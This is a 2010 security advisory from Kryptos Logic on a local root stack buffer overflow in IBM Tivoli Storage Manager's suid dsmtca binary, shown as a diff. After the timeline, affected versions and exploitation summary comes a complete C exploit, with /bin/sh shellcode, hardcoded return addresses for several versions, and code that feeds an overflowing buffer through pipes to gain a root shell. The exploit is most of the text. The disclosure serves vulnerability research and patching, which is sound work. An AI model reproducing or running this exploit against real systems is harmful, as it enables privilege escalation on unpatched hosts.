@@ -1,0 +1,308 @@
+http://www.kryptoslogic.com/advisories/2010/kryptoslogic-ibm-tivoli-dsmtca.txt
+http://www.kryptoslogic.com/advisories/2010/kryptoslogic-ibm-tivoli-dsmtca-exploit.c
+
+==-===-=====-=======-===========-=============-=================
+
+          IBM Tivoli Storage Manager (TSM) Local Root
+
+                Kryptos Logic, December 2010
+
+==-===-=====-=======-===========-=============-=================
+
+=====[ Timeline
+
+Vendor Contacted...........: 2009-12-14
+Fix from Vendor............: 2010-12-14
+Advisory Published.........: 2010-12-15
+
+
+=====[ Affected Versions
+
+Vulnerable:
+IBM TSM 6.1: 6.1.0.0 through 6.1.3.0
+IBM TSM 5.5: 5.5.0.0 through 5.5.2.7
+IBM TSM 5.4: 5.4.0.0 through 5.4.3.3
+IBM TSM 5.3: 5.3.0.0 through 5.3.6.7
+- Potentially older versions of IBM TSM dsmtca
+
+Not vulnerable:
+IBM TSM 6.1.4
+IBM TSM 5.5.3
+IBM TSM 5.4.3.4
+IBM TSM 5.3.6.10
+
+See IBM advisory IC65491 for details:
+http://www.ibm.com/support/docview.wss?uid=swg21454745
+
+
+=====[ Vulnerability
+
+When IBM TSM communicates with the suid root backup client
+dsmtca, it is handled through pipes. The function
+GeneratePassword() does not perform boundary checking, which can
+lead to a classic stack based buffer overflow - making local
+code execution possible.
+
+
+=====[ Exploitation
+
+The LANG environment variable gets copied to a fixed location in
+memory. An attacker can achieve arbitrary code execution by
+placing his shellcode in the variable, and then overwrite the
+return address of GeneratePassword() with the known address that
+the value is copied to.
+
+
+=====[ Credits
+
+Discovered by Peter Wilhelmsen and Daniel Kalici, Kryptos Logic.
+Exploit developed by Peter Wilhelmsen and Morten Shearman
+Kirkegaard, Kryptos Logic.
+
+
+=====[ About Kryptos Logic
+
+Kryptos Logic is a group of talented computer security experts
+from around the globe that has coalesced into a highly effective
+team. We provide a wide range of security products ranging from
+binary analysis, instrusion management systems, anti-piracy, and
+digital rights management software. We also perform
+state-of-the-art research on emerging attack vectors and threats
+to current digital infrastructure.
+
+http://www.kryptoslogic.com/
+
+Exploit:
+
+
+/*
+ * IBM Tivoli Storage Manager 6.1 - Local Root in DSMTCA GeneratePassword
+ * Copyright (C) 2009-2010 Kryptos Logic
+ *
+ * Bug discovered by Peter Wilhelmsen and Daniel Kalici.
+ * Exploit by Peter Wilhelmsen and Morten Shearman Kirkegaard.
+ *
+ * http://www.kryptoslogic.com/advisories/2010/kryptoslogic-ibm-tivoli-dsmtca.txt
+ * http://www.kryptoslogic.com/advisories/2010/kryptoslogic-ibm-tivoli-dsmtca-exploit.c
+ */
+
+#include <stdio.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <inttypes.h>
+
+char shellcode[] =
+  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d"
+  "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
+  "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
+  "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+enum arguments {
+	tcaProgramPath,
+	tcaDebugStop,
+	tcaAlertString,
+	tcaPipe0,
+	tcaPipe1,
+	tcaPipe2,
+	tcaPipe3,
+	tcaPswdFileName,
+	tcaLang,
+	tcaErrorLog,
+	tcaDsDir,
+	tcaRequest,
+	tcaSessID,
+	tcaServerName,
+	tcaPasswordFile,
+	tcaPasswordDir,
+	tcaBuildData,
+	tcaBuildTime,
+	tcaCliType,
+	tcaTraceTrusted,
+	tcaClusterEnabl,
+	tcaCryptoType,
+	tcaTerminate,
+	tcaArgCount
+};
+
+
+/* Find the buflen (56 in this case) in GeneratePassword().
+ *
+ * .text:0805B056 _Z16GeneratePasswordhiiP12pswdFileInfoPcS1_S1_S1_S1_ proc near
+ * ...
+ * .text:0805B155                 lea     eax, [ebp-56]
+ * .text:0805B158                 mov     [esp+4], eax    ; buf
+ * .text:0805B15C                 mov     [esp], edi      ; fd
+ * .text:0805B15F                 call    _read
+ *
+ *
+ * Set the retaddr (0x083C7100 in this case) to the Locale export.
+ *
+ * .data:083C7100 Locale          db 55h dup(0)           ; DATA XREF: .got:Locale_ptro
+ */
+struct {
+	char *name;
+	int buflen;
+	uint32_t retaddr;
+} versions[] = {
+	{ "5.5.1.4-linux-i386", 40, 0x0826E7E0 },
+	{ "5.5.2.0-linux-i386", 40, 0x08278180 },
+	{ "6.1.0.0-linux-i386", 56, 0x08356520 },
+	{ "6.1.3.0-linux-i386", 56, 0x083C7100 },
+	{ NULL }
+};
+
+
+
+void SpawnTask(char *argv[])
+{
+	pid_t pid;
+
+	signal(SIGCHLD, SIG_IGN);
+
+	pid = fork();
+
+	if (pid == -1) {
+		perror("fork() failed");
+		exit(EXIT_FAILURE);
+	}
+
+	if (pid != 0) {
+		return;
+	}
+
+	signal(SIGINT, SIG_IGN);
+	signal(SIGTERM, SIG_IGN);
+	signal(SIGQUIT, SIG_IGN);
+	signal(SIGPIPE, SIG_IGN);
+	signal(SIGSEGV, SIG_IGN);
+	signal(SIGXFSZ, SIG_IGN);
+	signal(SIGTSTP, SIG_IGN);
+	signal(SIGABRT, SIG_IGN);
+
+	execv(argv[0], argv);
+	perror("execv() failed");
+	exit(EXIT_FAILURE);
+}
+
+
+
+void exploit(int v)
+{
+	int pfd[2];
+	int cfd[2];
+	char p0[16];
+	char p1[16];
+	char p2[16];
+	char p3[16];
+	char buffer[64];
+	uint8_t len;
+	char *args[tcaArgCount];
+
+	len = versions[v].buflen + 8;
+	if (len > sizeof(buffer)) {
+		fprintf(stderr, "versions[%d].buflen > %d\n",
+			v, (int)sizeof(buffer));
+		exit(EXIT_FAILURE);
+	}
+
+	setenv("LANG", shellcode, strlen(shellcode));
+
+	if((pipe(pfd) == -1) || (pipe(cfd) == -1))
+	{
+		perror("pipe() failed");
+		exit(EXIT_FAILURE);
+	}
+
+	sprintf(p0, "%d", pfd[0]);
+	sprintf(p1, "%d", pfd[1]);
+	sprintf(p2, "%d", cfd[0]);
+	sprintf(p3, "%d", cfd[1]);
+
+	args[tcaProgramPath ] = "/opt/tivoli/tsm/client/ba/bin/dsmtca";
+	args[tcaDebugStop   ] = "0";
+	args[tcaAlertString ] = "TCA Interr\bfacee\b ADSM Release 3";
+	args[tcaPipe0       ] = p0;
+	args[tcaPipe1       ] = p1;
+	args[tcaPipe2       ] = p2;
+	args[tcaPipe3       ] = p3;
+	args[tcaPswdFileName] = "/etc/adsm/TSM.PWD";
+	args[tcaLang        ] = "/opt/tivoli/tsm/client/lang/en_US/dsmclientV3.cat";
+	args[tcaErrorLog    ] = "/var/log/dsmerror.log";
+	args[tcaDsDir       ] = "/opt/tivoli/tsm/client/ba/bin";
+	args[tcaRequest     ] = "C";
+	args[tcaSessID      ] = "NODE";
+	args[tcaServerName  ] = "SERVER";
+	args[tcaPasswordFile] = "/etc/adsm/TSM.PWD";
+	args[tcaPasswordDir ] = "";
+	args[tcaBuildData   ] = "AASATRG";
+	args[tcaBuildTime   ] = "DMESEEG";
+	args[tcaCliType     ] = "";
+	args[tcaTraceTrusted] = "0";
+	args[tcaClusterEnabl] = "0";
+	args[tcaCryptoType  ] = "1";
+	args[tcaTerminate   ] = (char *)NULL;
+
+	SpawnTask(args);
+
+	close(pfd[0]);
+	close(cfd[1]);
+
+	/* 0805A7BD	call	_read( fd, buf, 1 ) */
+	write(pfd[1], "\x41", 1);
+
+	/* 0805A7DD	call	_read( fd, var_AAA, 1 ) */
+	write(pfd[1], "\x41", 1);
+
+	/* 0805A7FD	call	_read( fd, var_5BB, 1 ) */
+	write(pfd[1], &len, 1);
+
+	/* 0805A824	call	_read( fd, var_28, var_5BB ) */
+	memset(buffer, 'A', sizeof(buffer));
+	*(uint32_t *)(buffer + len - 4) = versions[v].retaddr;
+	write(pfd[1], buffer, len);
+
+	/* read the response, needed to make GeneratePassword() return */
+	read(cfd[0], buffer, sizeof(buffer));
+
+	close(pfd[1]);
+	close(cfd[0]);
+}
+
+
+
+void usage(char *path)
+{
+	int i;
+
+	fprintf(stderr, "Usage: %s version\n", path);
+	fprintf(stderr, "\n");
+	fprintf(stderr, "Where \"version\" is one of:\n");
+	for (i=0; versions[i].name; i++) {
+		fprintf(stderr, "%s\n", versions[i].name);
+	}
+}
+
+
+
+int main(int argc, char *argv[])
+{
+	int i;
+
+	if (argc != 2) {
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	for (i=0; versions[i].name; i++) {
+		if (strcmp(argv[1], versions[i].name) == 0) {
+			exploit(i);
+			return EXIT_SUCCESS;
+		}
+	}
+
+	usage(argv[0]);
+	return EXIT_FAILURE;
+}
